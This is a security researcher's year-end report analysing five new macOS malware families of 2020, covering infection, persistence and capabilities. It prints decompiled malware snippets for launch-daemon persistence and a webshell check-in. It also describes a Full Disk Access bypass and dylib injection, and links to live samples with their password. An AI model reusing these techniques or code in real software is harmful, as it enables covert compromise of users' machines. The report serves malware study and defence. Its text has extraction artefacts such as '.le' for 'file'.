aboutbookstoreblogmalwareproductsThe Mac Malware of 2020 

a comprehensive analysis of the year's new malware 
by: Patrick Wardle / January 1, 2021 
Our research, tools, and writing, are supported by the "Friends of Objective-See": 
SmugMug Guardian Firewall SecureMac iVerify Halo Privacy 
Become a Friend! 

Want to play along? All samples covered in this post are available in our malware collection. …just make sure not to infect yourself!!

 Printable 
A printable (PDF) version of this report can be downloaded here: 
The Mac Malware of 2020.pdf


 Background 
Goodbye, and good riddance 2020 …and hello 2021! 

In recent years, malicious programs targeting macOS have grown in prevalence (and sophistication), perhaps even reaching parity withMicrosoft Windows platforms. This is well illustrated in Malwarebytes' “2020 State of Malware Report": 
"And for the .rst time ever, Macs outpaced Windows PCs in number of threats detected per endpoint." -Malwarebytes 

Threats per endpoint, Macs vs. Windows (credit: Malwarebytes) 
It is important to note these statistics include both adware (and potentially unwanted programs). And the reality is, if a Mac user is infectedwith malicious code, more than likely it will be adware (vs. a sophisticated nation-state backdoor): 
"The vast majority of threats for macOS in [recent years] were in the AdWare category." -Kaspersky 
However, it is wise not to underestimate the potential impact of adware, upon its victims. The noted security researcher, Thomas Reed articulates this well in writeup titled “Mac adware is more sophisticated and dangerous than traditional Mac malware": 
"However, adware and PUPs can actually be far more invasive and dangerous on the Mac than “real” malware. They canintercept and decrypt all network tra.c, create hidden users with static passwords, make insecure changes to systemsettings, and generally dig their roots deep into the system so that it is incredibly challenging to eradicate completely." ­Thomas Reed 
…now, back to malware! For the .fth year in a row, I’ve decided to put together a blog post that aims to comprehensively cover all the newMac malware that appeared during the course of the year. While the malware may have been reported on before (i.e. by the AV companythat discovered them), this blog aims to cumulatively and comprehensively cover all the new Mac malware of 2020 in one place …yes, withsamples of each malware for download, so that you can play along! #SharingIsCaring 
In this blog post, we focus on new Mac malware specimens or new variants that appeared in 2020.Adware and/or malware from previous years, are not covered. 
However at the end of this blog, I’ve included a brief section dedicated to these other threats, thatincludes links to detailed write-ups. 
For each malicious specimen covered in this post, we’ll identify the malware’s: 

Infection
 Vector: How it was able to infect macOS systems. 


Persistence
 Mechanism: How it installed itself, to ensure it would be automatically restarted on reboot/user login. 


Features
 & Goals: What was the purpose of the malware? a backdoor? a cryptocurrency miner? or something more insidious… 


Also, for each malware specimen, I’ve added a direct download link in case you want to follow along with our analysis or dig into themalware more! 
I’d personally like to thank the following organizations, groups, and researchers for their work, analysis, & assistance! VirusTotal. @thomasareed, @morpheus______, @philo.shal, and others who choose to remain unnamed. 




 Malware Analysis Tools & Tactics 
Throughout this blog, we’ll reference various tools used in analyzing the malware specimens. 
These include: 

ProcessMonitor 
Our user-mode (open-source) utility that monitors process creations and terminations, providing detailed information about such events. 

FileMonitor 
Our user-mode (open-source) utility monitors .le events (such as creation, modi.cations, and deletions) providing detailedinformation about such events. 

WhatsYourSign
Our (open-source) utility that displays code-signing information, via the UI. 

Netiquette
Our (open-source) network monitor. 
lldb The de-facto commandline debugger for macOS. Installed (to /usr/bin/lldb) as part of Xcode. 

Hopper Disassembler
A “reverse engineering tool (for macOS) that lets you disassemble, decompile and debug your applications” …or malware specimens!
 Interested in general Mac malware analysis techniques?...you're in luck, as I've written an entire (free) book on this very topic: 
The Art Of Mac Malware, Vol. 0x1: Analysis

 Timeline 

The latest Lazarus APT group backdoor. 









OSX.Dacls 
Dacls is a macOS port of the cross-platform Dacls RAT (created by the Lazarus APT group), whichaffords a remote attacker complete control over an infected system. 

Download: OSX.Dacls (password: infect3d) 
Dacls originally was discovered in 2019, but at that time was only seen targeting Windows and Linux systems: 
"Dacls is a RAT that was discovered by Qihoo 360 NetLab in December 2019 as a fully functional covert remote accessTrojan targeting the Windows and Linux platforms." -Malwarebytes 
…in 2020, MalwareBytes uncovered a macOS variant. 

Writeups: 

“The Dacls RAT …now on macOS!" 

“New Mac variant of Lazarus Dacls RAT distributed via Trojanized 2FA app” 

Infection Vector: Trojanized (2FA) Application 
MalwareBytes, who uncovered the Mac variant of OSX.Dacls, note: 
"[the] Mac version is ...distributed via a Trojanized two-factor authentication application for macOS called MinaOTP" 
The trojanized application was (re)named TinkaOTP, and distributed via disk image TinkaOTP.dmg 
…it is likely that the attackers relied on social engineering e.orts, having to coerce macOS users to download and run trojanizedapplication. This is the de-factor infection mechanism leveraged by Lazarus group for many years (to target macOS users). For example back in 2018, after creating a fake crypto-currency site, they emailed users with links to download OSX.AppleJeus: 

OSX.AppleJeus infection vector 
The application, TinkaOTP.app is signed “adhoc-ly” (as the Lazarus group often does): 

This also means that on modern versions of macOS (unless some exploit is .rst used to gain code execution on the target system), theapplication will not (easily) run: 

macOS blocking TinkaOTP.app 
Let’s now take a closer look at the application bundle of TinkaOTP.app: 

TinkaOTP Application Bundle 
If the user runs the (trojanized) application, infection will commence. Speci.cally, /Contents/MacOS/TinkaOTPbinary will copy a .le from within its application bundle (Resources/Base.lproj/SubMenu.nib), to ~/Library/.minaand then executing it. 
This can be passively observed via our ProcessMonitor: 




Persistence: Launch Item 
OSX.Daclspersists as a launch item (com.aex.lop.agent.plist). If running as root, it will persists as a launch daemon, otherwise, as a user launch agent. 
The binary SubMenu.nib (which recall, was copied to ~/Library/.mina) contains both a template for, and path to, the persistent launch item property list: 
OSX.Dacl's launch item template OSX.Dacl's launch item path Via our FileMonitor, one can passively observe the malware creating the launch item (here a user launch agent,~/Library/LaunchAgents/com.aex-loop.agent.plist): 
As the value for the RunAtLoadkey in com.aex-loop.agent.plist is set to true, the malware will be automatically (re)started by macOS each time the system is rebooted (and the user logs in). 

Capabilities: Persistent Backdoor (+ plugins). 
We noted that OSX.Dacls is a macOS port of a Windows/Linux RAT. The initial report on the (Windows/Linux versions of the) Dacls RAT, was published in December 2019, by Netlab. Titled, “Dacls, the Dual platform RAT”. In terms of the RATs capabilities, the report noted it utilizes a modular plugin architecture: 
"[Dacls] uses static compilation to compile the plug-in and Bot code together. By sending di.erent instructions to call di.erent plug-ins, various tasks can be completed. 
The main functions of …Dacls Bot include: command execution, .le management, process management, test networkaccess, C2 connection agent, network scanning module.” -Netlab 
The report describes various plugins such as a: 

File
 plugin


Process
 plugin



“Test” plugin“Reverse P2P” plugin


“LogSend” plugin 
Analyzing the malware’s disassembly (speci.cally searching for LoadPlugin_* functions), we can see that the macOS variant of Dacls supports these same plugins (plus several others, such as SOCKS plugin): 

OSX.Dacl's Plugins 
Via these plugins a remote attackers can interact with and fully control an infected system by: 

Executing
 system commands


Process
 actions, such as listing, creating, & terminating


File
 action such as upload/download, read/write, & deleting



…and more (such as performing network scans). 
For more details on the plugins and their implementation, see Netlab’s report: 
"Dacls, the Dual platform RAT" 



OSX.EvilQuest 
EvilQuest (also known as ThiefQuest) is a (true) computer virus, that also provides remote taskingand ransomware logic. 

Download: OSX.EvilQuest (password: infect3d) 
The noted Malware researcher Dinesh Devadoss discovered OSX.EvilQuest and tweeted about its ransomware tendencies and impersonation as Google Software update: 
Dinesh_Devadoss @dineshdina04 #macOS #ransomware impersonating as Google Software Update program with zero detection. MD5: 522962021E383C44AFBD0BC788CF6DA3 6D1A07F57DA74F474B050228C6422790 98638D7CD7FE750B6EAB5B46FF102ABD @philofishal @patrickwardle @thomasareed 8:19 AM · Jun 29, 2020 219 157 people are Tweeting about this Further analysis uncovered other insidious capabilities, including the ability to virally infected other binaries on an infected system! 

Writeups: 

“OSX.EvilQuest
 Uncovered (Part 1)" 


“OSX.EvilQuest
 Uncovered (Part 2)" 



“Updates on ThiefQuest, the Quickly-Evolving macOS Malware” 


Infection Vector: Pirated Software 
From Dinesh’s tweet, it was not apparent how the malware was able to infect macOS users. However, Thomas Reed of Malwarebytes,noted that the malware had (also?) been found in pirated versions of popular macOS software, shared on popular torrent sites: 

Pirated Application, Infected with OSX.EvilQuest (credit: Malwarebytes) 
Ethical reasons aside, it's generally unwise to install pirated software, as it is often infectedwith malware. 
“Torrent sites are notorious for distributing malware and adware, sometimes through misleadingadvertisements, and sometimes through Trojan horse downloads that claim to be ‘cracks’ or that maycontain infected copies of legitimate software” -Intego 
The sample analyzed here, was packaged in a pirated version of the popular DJ software Mixed In Key. The malicious package wasunsigned …meaning macOS will prompt the user before allowing it to be opened: 

OSX.EvilQuest Infection Vector 
However, macOS users attempting to pirate software will likely ignore this warning, pressing onwards …ensuring infection commences. 
We can use the Suspicious Packageutility to statically examine the package contetns. It contains an application named Mixed In Key 8and binary named “patch": 

Clicking on the “All Scripts” tab, we .nd also .nd a post install script: 
1 #!/bin/sh 

This post install script (which is executed during the package installation) will .rst create a /Library/mixednkey directory. Then, it moves the patch binary into this directory (renaming it toolroomd), sets it to be executable …and then launches it. 
As the installer requests root privileges during the install, this script (and thus the toolroomd binary) will also run with root privileges: 

As the "Mixed In Key 8" binary is (still) validly signed by the Mixed In Key developers, it is likely
pristine and unmodified 
…the malicious components of the package, are thus the post install script and the patch binary. 


Persistence: Launch Item 
Depending on its privilege level, OSX.EvilQuestpersists either as a user launch agent, or a launch daemon (and a launch agent). The code responsible for this logic is found within a function named ei_persistence_main. 
After invoking various anti-analysis logic (e.g. debugger check), the function then invokes a helper function, persist_executableto install the malware. If the malware is running with non-root privileges it copy itself to ~/Library/AppQuest/com.apple.questd. However, if running as root, it will also copy itself to /Library/AppQuest/com.apple.questd. 
Once the malware has copied itself, it persists via a launch item. The code that performs this persistence is found in theinstall_daemonfunction (invoked by ei_persistence_main). If running as non-root, it persists as a launch agent: ~/Library/LaunchAgents/com.apple.questd.plist. If the malware is running with root privileges it will invoke the install_daemon function again, but this time specifying that a launch daemon should be created. 
After the malware has ensured it is persisted (twice, if running as root!), it invokes the ei_selfretain_mainfunction to start the launch item(s). This function invokes the aptly named run_daemon which in turn invokes macOS’s osascriptbinary to launch the items via an AppleScript command: 

OSX.EvilQuest launch item persistence 
The template for the property list for these launch item(s) is stored as an encrypted string withinthe malware. 
As the RunAtLoad is set to true in the malware’s launch item plist (com.apple.questd.plist), macOS will automatically restart the malware on subsequent reboots. 

Capabilities: File Ex.ltration, Remote Tasking, Ransomware, Viral Infection ...and more! 
One of the .rst actions taking by OSX.EvilQuest, is to scan an infected system for various .les that match a list of embedded regular expressions. From these regexes, we can ascertain that the malware has a propensity for certi.cates and crypto-currency keys & wallets: OSX.EvilQuest's .le ex.ltration 

Any .le on the infected system that matches any of these regexes will be ex.ltrated to the attacker (including, as shown above, a test .le,key.png). 
The malware also supports remote tasking, including the following: 

Task 0x1: react_exec 
The react_exec command appears to execute a payload received from the server. Interestingly it attempts to .rst execute the payload directly from memory! Speci.cally it invokes a function named ei_run_memory_hrdwhich invokes the AppleNSCreateObjectFileImageFromMemory, NSLinkModule, NSLookupSymbolInModule, and NSAddressOfSymbolAPIs to load and link the in-memory payload. 
At a previous BlackHat talk (“Writing Bad @$$ Malware for OS X”), I discussed this technique (an noted Apple used to host samplecode to implement such in-memory execution): 

If the in-memory execution fails, the malware writes out the payload to a .le named .xookc, sets it to be executable (via chmod), then executes via a call to system. 

Task 0x2: react_save The react_save decodes data received from the server and saves it to a .le. It appears the .le name is speci.ed by the server as well. In some cases the .le will be set to executable via a call to chmod. 

Task 0x4: react_start This method is a nop, and does nothing: 


Task 0x8: react_keys 
The react_keys command starts a keylogger. Speci.cally it instructs the malware to spawn a background thread to execute a function named eilf_rglk_watch_routine. This function creates an event tap (via the CGEventTapCreateAPI), add it to the current runloop, then invokes the CGEventTapEnableto activate the event tap. Once the tap is activated, keypresses (e.g. by the user) will be delivered to the process_eventfunction, which then converts the the raw keypresses “readable” key codes (via the kconvert function). Somewhat interestingly, the malware then passes the converted key code to the printf function …to print them out? (You’d have thunk it would write them to a .le …). Perhaps this part of code is not quite done (yet)! 

Task 0x10: react_ping 
The react_ping command simply compares a value from the server with the (now decrypted) string "Hi there". A match causes this command to return “success”, which likely just causes the malware to respond to the server for (more) tasking. 

Task 0x20: react_host 
This method is a nop, and does nothing: 


Task 0x40: react_scmd The react_scmd command will execute a command from the server via the popenAPI: 

The response (output) of the command is read, and transmitted about to the server via the eicc_serialize_requestand 
http_requestfunctions. 
The most readily observable side-a.ect of an OSX.EvilQuest infection is its .le encryption (ransomware) activities. 
After the malware has invoked a method named _s_is_high_time and waited on several timers to expire, it begins encrypting the (unfortunate) user’s .les, by invoking a function named carve_target. 
The carve_target .rst begins the key generation process via a call to the randomAPI, and functions named eip_seedsand eip_key. It then generates a list of .les to encrypt, by invoking the get_targetsfunction, passing in the is_file_targetas a .lter function. This .lter function .lters out all .les, except those that match certain .le extensions. The encrypted list of extensions is hard-coded in the malware. 
Armed with a list of target .les (that match the above extensions), the malware completes the key generation process (via a call torandom_key, which in turn calls srandomand random), before calling a function named carve_targeton each .le. 
The carve_target function is invoked with the path of the .le to encrypt, the result of the call to random_key, as well as values from returned by the calls to eip_seedsand eip_key. 
It takes the following actions: 
1. 
Makes sure the .le is accessible via a call to stat 

2. 
Creates a temporary .le name, via a call to a function named make_temp_name

3. 
Opens the target .le for reading 

4. 
Checks if the target .le is already encrypted via a call to a function named is_carved (which checks for the presence of BEBABEDDat the end of the .le). 

5. 
Open the temporary .le for writing

6. 
Read(s) 0x4000 byte chunks from the target .le 

7. 
Invokes a function named tpcryptto encrypt the (0x4000) bytes 

8. 
Write out the encrypted bytes to the temporary .le 

9. 
Repeats steps 6-8 until all bytes have been read and encrypted from the target .le 

10. 
Invokes a function named eip_encryptto encrypt (certain?) keying information which is then appended to the temporary .le 

11. 
Writes 0DDBEBABEto end of the temporary .le (as noted by Dinesh Devadoss) 

12. 
Deletes the target .le 

13. 
Renames the temporary .le to the target .le 



OSX.EvilQuest's .le ransom logic 
Once all the .les in the list of target .les have been encrypted, the malware writes out the following to a .le named READ_ME_NOW.txt: 

OSX.EvilQuest's ransom note 
To make sure the user reads this .le, it displays the following modal prompt, and reads it aloud via macOS built-in saycommand: OSX.EvilQuest's ransom alert 

The encryption logic was broken by researchers at SentinelOne: "Breaking EvilQuest | Reversing A Custom macOS Ransomware File Encryption Routine" Moreover, the ransomware logic has been removed in subsequent versions of the malware. 
The most unique feature of OSX.EvilQuest is its capabilities to (locally) virally propagate. In short, the malware generates a list of executables on the system, the invokes a method named append_aito inject itself into the binary: 

OSX.EvilQuest's viral infection logic 
The following image illustrates the details of the viral infection: 

OSX.EvilQuest's viral infection logic 
To ensure the infected binary acts “normal” (i.e. runs its original code so that nothing appearsamiss), the viral code writes the programs original bytes out to a new file named: .<orginalfilename>1. This file is then set executable (via chmod) and executed (via execl). 
By injecting itself into the start of the (other) binaries on the system, the malware ensures that it is rather di.cult to remove! 



OSX.WatchCat 
WatchCat appears to be a Lazarus APT group creation, that builds off previous backdoors …while addingnew capabilities. 

Download: OSX.WatchCat (password: infect3d) 
As noted by the macOS security researcher Scott Knight, information about OSX.WatchCatwas made public via the addition of an XProtect signature (version 2127): 
Scott Knight @sdotknight XProtect 2127 adds two new rules to detect "watchcat". VT engines label it as NukeSpeed. Could be Lazarus related. 3bb96bfaf492782b38985f4bd6b7e7f9dc22c1332b42bb74b 16041298fd31f93 4:19 AM · Jul 24, 2020 11 See Scott Knight’s other Tweets Scanning the malicious binary via UXProtect, shows a match on XProtect_MACOS_580a1bc: 



…thus, it’s possible that OSX.WatchCat is distributed in a similar manner. 

Persistence: Launch Daemon Taking a peak at the OSX.WatchCat binary, we .nd an embedded launch daemon property list: 

This (embedded) plist is referenced from a function named InsertToLaunchDaemons:
 1 int _InsertToLaunchDaemons(int arg0, int arg1) {2 plist = malloc(strlen(arg0) + 0x400);3 sprintf_chk(plist, 0x0, 0xffffffffffffffff, "<?xml version=\"1.0\" encoding=\"UTF-8\"? 
>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plistversion=\"1.0\">\n<dict>\n<key>Label</key>\n<string>com.apple.watchcat</string>\n<key>ProgramArguments</key>\n<arr…", arg0, arg1);
4 5 sprintf_chk(path, 0x0, 0x104, "/Library/LaunchDaemons/%s", "com.apple.watchcat.plist");6 file = fopen(path, "wb");7 if (file != 0x0) {8 fwrite(plist, strlen(plist), 0x1, rbx);9 fclose(file);
10 chmod(path, 444o);
11 }12 ... 

The above code .rst formats the property lists (i.e. adds the full path the malware’s binary image), and builds a path to the launch daemon(/Library/LaunchDaemons/com.apple.watchcat.plist). It then writes out the (now con.gured) plist. 
As the RunAtLoadkey is set to true the malware will be automatically (re)started each time the system is rebooted. 
…however the .rst time (i.e. prior to reboot), the malware manually starts the launch daemon via the SinLaunchCTLfunction. This function simply invokes launchctl loadon the launch daemon plist (com.apple.watchcat.plist): 
1 int SinLaunchCTL() {2 sprintf_chk(path, 0x0, 0x104, "/Library/LaunchDaemons/%s", "com.apple.watchcat.plist");3 sprintf_chk(command, 0x0, 0x200, "launchctl load %s > /dev/null 2>&1 &", path);4 rax = popen(command, "r");5 ... 
6} 

Capabilities: Backdoor, plus "webshell" 
Mac malware analyst Phil Stokes notes in a recent writeup: 
"...there are some overlaps with the earlier [Lazarus Group] backdoor samples ...there is also much more to this malware thathas not been seen in the other samples, including use of a WebShell. 
Before taking a look at the webshell, let’s discuss OSX.WatchCat’s download and execute functionality. 
To execute external commands and processes, the malware invokes the popen system API. By looking at cross-references (x-refs) to this API, we can .nd the code responsible for executing commands from the server: 

The malware’s MsgCmdfunction, invokes popen on a passed in argument: 


Working backwards, we see that the MsgCmd function is invoked from the CmdProcfunction. The CmdProc.rst invokes the SendMsgOnlyType function (to send an message to a remote command & control server via the curl APIs). Then parses the response and acts upon it: As (just) noted, the MsgCmdwill executed the speci.ed command. 

Other commands appear to provide a remote attacker the ability to: 

download .les upload .leskill a process (MsgPK) delete a .le (MsgSdel) …and more! As Phil noted, this is similar to the capabilities a.orded by other Lazarus Group backdoors (such as OSX.Yort). Also though he noted theaddition of the “use of a WebShell.” 
The “webshell” logic is found in the Auth_WebShell function (which is invoked in a loop by the malware’s Startfunction). It appears to be a simple check in, with a value of 259D7B1TE1002A65:
 1 int Auth_WebShell() {2 ... 3 rax = rand();4 _g_nBoardID = rax + -((0xffffffffe90452d5 * rax >> 0x2d) * 0x2328) + 0x3e8;5 *(&var_60 + 0x8) = '56A2001E';6 var_60 = 'T1B7D952';7 8 var_A4 = rand();9 rax = SendRawData(_g_HttpSetting, ..., &var_60, &var_A4, 0x4);
10 if (rax != 0x0) {11 rbx = 0x0;12 rax = RecvRawData(&var_80, 0x4);13 if (rax != 0x0) {14 __sprintf_chk(&var_A0, 0x0, 0x20, "%04d", *(int32_t *)_g_nBoardID);15 rax = strcmp(&var_A0, &var_80);16 rbx = rax ==0x0?0x1:0x0;
17
 }

18
 }19 ... 20 return rax;

21 
} 


For more details on OSX.WatchCat and other similar (and recent) Lazarus Group backdoors, see Phil’swriteup: 
"Four Distinct Families of Lazarus Malware Target Apple’s macOS Platform" 

OSX.XCSSET 
XCSSET is rather unique, as it targets macOS developers (Xcode users) and leverages several 0days tosteal passwords and exfiltrate data. 

Download: OSX.XCSSET (password: infect3d) 
In July, I noticed that Apple’s XProtect update (v. 2126) had added a new signature for a sample Cupertino named MACOS.2070d41: 
patrick wardle @patrickwardle Apple's XProtect update (v2126) contains a new signature: "MACOS.2070d41" Looks for compiled AppleScript, w/ strings such as "curl --connect-timeout 10 -ks -d" 0 hits on @virustotal :( @AppleSupport, can you share info/hashes w/ others looking to help protect macOS users?4:11 PM · Jul 13, 2020 86 26 people are Tweeting about this …in wasn’t till August, when TrendMicro researchers released their report on (and IoCs for) OSX.XCSSET that we learned more about this intriguing malware. 
"We have discovered an unusual infection related to Xcode developer projects. Upon further investigation, we discoveredthat a developer’s Xcode project at large contained the source malware [OSX.XCSSET], which leads to a rabbit hole ofmalicious payloads." -TrendMicro 
TrendMicro’s technical analysis of OSX.XCSSET is incredibly detailed and thorough. If you’re
interested in more details about this malware, it’s a must read: 
"XCSSET Mac Malware: Infects Xcode Projects, Performs UXSS Attack on Safari, Other Browsers,Leverages Zero-day Exploitss" 

Writeups: 
“Mac malware exposed: XCSSET, an advanced new threat” “What is OSX.XCSSET malware and what should I do about it?" “XCSSET Mac Malware: Infects Xcode Projects, Performs UXSS Attack on Safari, Other Browsers, Leverages Zero-day
Exploits” 

Infection Vector: (user-downloaded) Xcode Projects 
Xcode is the de-facto IDE for developing software for Apple devices (iOS, macOS, etc.). It appears that OSX.XCSSETwas originally discovered hiding within various developer’s Xcode projects. Several of these infected projects were found/hosted online (on Github). 
The primary method of infection is user-downloaded Xcode projects. If an XCSSET-infected Xcode project is opened and built, maliciouscode will run on the developer’s Mac. 
TrendMicro explains: 
"This threat primarily spreads via Xcode projects... It is not yet clear how the threat initially enters these systems.Presumably, these systems would be primarily used by developers. These Xcode projects have been modi.ed such thatupon building, these projects would run a malicious code. 
This eventually leads to the main XCSSET malware being dropped and run on the a.ected system. Infected users are alsovulnerable to having their credentials, accounts, and other vital data stolen." -TrendMicro 

Xcode project infected with OSX.XCSSET (credit: TrendMicro) 
For readers interested in the specifics of OSX.XCSSET’s Xcode project subversion (infection), seeTrendMicro’s report (pp. 1-4): 
"XCSSET Mac Malware: Infects Xcode Projects, Performs UXSS Attack on Safari, Other Browsers,Leverages Zero-day Exploitss" 

Persistence: None(?) 
It appears that OSX.XCSET does not persist, but rather relies on the user triggering both the initial infection and (subsequent) re-executions of the malware …for example building an infected Xcode project, or running one of the applications it modi.es. 
However, due to the primary goals of the malware (credential stealing and .le ex.ltration), there may be no need, nor advantage, to themalware persisting. 
In terms of application modi.cations (which can lead to “persistence” via user interactions), OSX.XCSSET modi.es (references) Safari (not the actual Safari.app which would invalidate the code signature). 
The TrendMicro report notes: 
"This is done so that when the infected user wants to open the normal Safari browser, the fake one will get executed
instead. 
...functionally, this means that the fake Safari browser runs instead of the legitimate version of Safari." -TrendMicro 
It should also be noted that several of the malware’s modules reference launch agent property lists …property lists that are likely related tothe malware. For example (as noted by TrendMicro) the remove_oldmodule, “removes … ~/Library/LaunchAgents/com.apple.core.launchd.plist” while the cleanermodule “removes ~/Library/LaunchAgents/com.apple.core.accountsd.plist” 
…thus some versions/variants of the OSX.XCSSETmay persist via normal mechanisms (e.g. launch agents). 

Capabilities: Credential Stealing, Data Ex.ltration, Ransomware, Viral Replication ...and more! 
One of the main goals of `OSX.XCSSET` is to steal credentials and ex.ltrate data from user applications. A writeup by Intego notes: 
"XCSSET attempts to steal passwords from victims’ Apple ID, Google, Paypal, and other accounts. ...[the malware] alsoattempts to ex.ltrate data from apps such as Apple Notes, Evernote, Skype, Telegram, and WeChat" -Intego 
It should be noted that on recent versions of macOS, malware is are prevented from accessing various user/system .les, unless the userhas manually granted the application “Full Disk Access” (via the System Preferences application). 
To work around this privacy mechanism, OSX.XCSSET leverages (what were) two 0day exploits: 
·Aug 13, 2020 patrick wardle @patrickwardle Kinda stoked macOS malware is stepping up its game New from @TrendMicro, details on OSX.XCSSET: "Mac Malware: Infects Xcode Projects, Performs UXSS Attack on Safari...Leverages [Two!] Zero-day Exploits": blog.trendmicro.com/trendlabs-secu… Technical Details: documents.trendmicro.com/assets/pdf/XCS… patrick wardle @patrickwardle Exploit 0x1: ...bypass Full Disk Access via SSHD to access (protected) Safari cookies 9:01 PM · Aug 13, 2020 16 See patrick wardle’s other Tweets The .rst vulnerability (implemented in the malware’s safari_cookiemodule) abuses the fact that Full Disk Access is granted to thessh service. The malware simply (ab)uses scp to “connect” to the system it’s running on (username@localhost) and copy protected .les (e.g. Safari’s binary cookie .le). 
For more details on this exploit, see 
"The vulnerability in Remote Login (ssh) persists". 
The second vulnerability involves leverages SafariForWebKitDevelopment: As noted in a Jamf writeup on the malware: 
·Aug 13, 2020 patrick wardle @patrickwardle Replying to @patrickwardle Exploit 0x2: (ab)use SafariForWebKitDevelopment "to perform malicious operations w/o user approval" patrick wardle @patrickwardle Also, Dylib Hijacking!?9:05 PM · Aug 13, 2020 16 See patrick wardle’s other Tweets "The second exploit leverages a developer speci.c tool. If the device doesn’t already have the SafariForWebKitDevelopmentcomponent installed, the malware goes and downloads it. With this, it can utilize Safari’s extensive capabilities without beinghindered by the usual sandbox." -Jamf 
…in order to gain code execution within the context of Apple’s SafariForWebKitDevelopment binary, the malware (ab)uses the DYLD_FRAMEWORK_PATHand DYLD_LIBRARY_PATH environment variables: 

OSX.XCSSET's dylib injection (credit: TrendMicro) 
Once loaded within the (developer version of) Safari, the malicious code (JavaScript) can be downloaded and executed without beingconstrained by normal browser restrictions. This allows it manipulate browser results, as well as steal credentials from various sites ofinterest. 
The combination of these two exploits is rather potent, and allows OSX.XCSSet perform its credential stealing and data ex.ltration actions quite e.ectively: 
"XCSSet e.ectively has all the tools it needs to run arbitrary code and touch every .le on the system, neatly sidesteppingthe strong defenses in macOS." -Jamf 
And what if the user doesn’t have Safari? Well as Intego notes: 
“And just in case the victim doesn’t use Safari, XCSSET also has the capability of installingTrojanized versions of many other Mac browsers: Google Chrome, Mozilla Firefox, Microsoft Edge,Brave, Opera, 360 (a Chinese browser), and Yandex (a Russian browser).” 
Besides credential / data stealing, OSX.XCSSETsupports a myriad of other capabilities (implemented via payload modules). The TrendMicro report summarizes the plugins (and their capabilities). Some notable plugins, mentioned in the report include: 
screen: Takes screenshots of an infected system. 
encrypter: Encrypts (ransoms) users .les (via AES in CBC mode). 
replicator: Infects local Xcode projects with its malicious code. 

OSX.FinSpy 
FinSpy is commercial cross-platform implant, supporting a myriad of cyber espionage features &capabilities. 

Download: OSX.FinSpy (password: infect3d) 
The malware was discovered by Amnesty International, as seen in the tweet by Claudio Guarnieri, their “Head of Security Lab”: 
nex @botherder Sometimes threat intel is hard, sometimes folks leave all FinFisher samples exposed on a webserver. So here ya go, along with recent Windows and Android, we're publishing details on new FinFisher for Mac OS and Linux . German-made FinSpy spyware found in Egypt, and Mac and Linux versions … • FinSpy is a commercial spyware suite produced by the Munich-based company FinFisher Gmbh. Since 2011 researchers have documented … numerous cases of targeting of Human Rights Defenders (HRDs) -... amnesty.org 1:08 AM · Sep 25, 2020 382 274 people are Tweeting about this Titled, “German-made FinSpy spyware found in Egypt, and Mac and Linux versions revealed,” the Amnesty International writeup detailed FinFisher’s spyware suite (FinSpy), including “previously undisclosed versions for Linux and MacOS computers” 
As noted in their report: 
"FinSpy is a commercial spyware suite produced by the Munich-based company FinFisher Gmbh. Since 2011 researchershave documented numerous cases of targeting of Human Rights Defenders (HRDs) - including activists, journalists, anddissidents with the use of FinSpy in many countries, including Bahrain, Ethiopia, UAE, and more." 

Writeups: 
“FinFisher Filleted 
” “The Fin.sher Tales, Chapter 1: The dropper” “German-made FinSpy spyware found in Egypt, and Mac and Linux versions revealed” 

Infection Vector: Unknown 
Amnesty International uncovered “a server located at the IP address 158.69.105[.]207” …hosting various FinSpy samples, including amacOS variant: 

FinSpy Server (credit: Amnesty International) 
Unfortunately there was no clear indication how (macOS) targets were infected. 
Commercial spyware is often sold to customers, who are then responsible for figuring out how todeploy the software to (read: infect) targets of interest. 
Such customers may (separately) purchase exploits, or craft their own social engineering campaigns tocompromise their targets. 
However, we should note that the malware was distributed as disk image, containing a single item: an application bundle named Install Çaglayan: 

/Volumes/caglayan-macos/Install Çaglayan.app 
…with a bundle identi.er of com.coverpage.bluedome.caglayan.desktop.installer: 

This may indicate that the malware was distributed as a trojanized application or perhaps was attempting to masquerade as a legitimateapplication (perhaps for the Turkish news(?) site, Çaglayan (caglayandergisi.com)). 

Persistence: Launch Agent If the malicious application (Install Çaglayan.app) is run, it will eventually execute an installer (that was copied to~/Library/Caches/org.logind.ctp.archive/installer). 
As noted in the Amnesty writeup, this installer performs three actions: 
1. 
Copies plugins and con.g .les to /Library/Frameworks/Storage.framework. 

2. 
Copies the launcher (logind) to /private/etc/logind. 

3. 
Persists the launcher, by creating a launch agent plist: /System/Library/LaunchAgents/logind.pslist. 


Let’s take a closer look at it now, to highlight the code responsible for these actions. 
The org.logind.ctp.archive/installer is a Mach-O binary, rather similar (albeit simpler) than its parent,.log/ARA0848.app/Contents/MacOS/installer. (For example, both contain a custom GIFileOpsclass that implements various .le related methods (copy: to:, loadAgent, etc.). 
This (next stage) installer’s main method starts at 0x000000010a3d95ac. The logic the the main function .rst checks for the presence of various .les (plugins?), such as /Library/Frameworks/Storage.framework, /Contents/Resources/7f.bundle/Contents/Resources/AAC.dat. It then builds a dictionary of key-value pairs via a call to [GIPath installationMap]: As we can see in the debugger output, this maps .les from the decrypted uncompressed archive (org.logind.ctp.archive) to their .nal destinations. 

The installer then iterates over each of these .les, and via a block (at 0x000000010a3da4d2) moves them from the archive to their (.nal) destinations: 
1 files = [GIPath installationMap];2 [files enumerateKeysAndObjectsUsingBlock:(void (^)(KeyType src, ObjectType dest, BOOL
*stop))3{4 5 [GIFileOps move:src to:dest];6 [GIFileOps setStandardAttributes:dest];7 8 }]; 
We can passively observe this via our File Monitor: 


Let’s take a closer look at the logind.plist: 

As the RunAtLoadkey is set to true, the binary, /private/etc/logind will be automatically (re)executed each time the system is rebooted an the user logs in. 
Once the installer has, well, installed (and setuid’d) these various components, it kicks o. this persistent launch agent via a call to
[GIFileOps loadAgent:] This method simply invokes launchctlwith the load command line argument, and path to the logind.plistto:
 1 +(char)loadAgent:(char *)plist {
2 
 3  task = [[NSTask alloc] init]; 
4  [task setLaunchPath:@"/bin/launchctl"]; 
5  args = [NSArray arrayWithObjects:@"load", plist, 0x0]; 
6  [r15 setArguments:args]; 
7 
 8  [task launch]; 
9  [task waitUntilExit];  


The persistent implant (/private/etc/logind), is now o. and running! 
Capabilities: Persistent Implant with plugin-based modules and a kernel-level rootkit 

Amnesty’s writeup details the capabilities of FinSpy, noting such capabilities are implemented via plugins: 
